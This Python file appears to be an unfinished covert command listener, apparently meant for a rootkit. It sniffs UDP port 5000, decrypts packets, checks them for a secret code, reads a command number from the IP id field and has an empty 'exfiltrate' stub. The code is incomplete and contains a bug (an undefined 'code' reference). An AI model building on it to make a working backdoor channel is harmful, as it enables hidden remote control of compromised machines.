import requests
from scapy.all import *

from encryption import encryption


class remote_receiver:
    def __init__(self, code, key, rkit):
        self.rkit = rkit
        self.code = code
        self.key = key
        conf.use_pcap = True
        self.encrypter = encryption(key)

    def exfiltrate(self):
        print("exfiltrate here")

    def listen_loop(self):
        sniff(filter="udp and port 5000", prn=self.packet_handler)

    def packet_handler(self, captured_packet):
        main_payload = captured_packet[0].payload
        encrypted_data = main_payload.payload.payload
        decrypted_data = str(self.encrypter.decrypt(encrypted_data))
        if code in decrypted_data:
            print("code found")
        else:
            print("code not found")
            return
        payload_id = main_payload.id
        command = payload_id % 10
        print("handle packet")


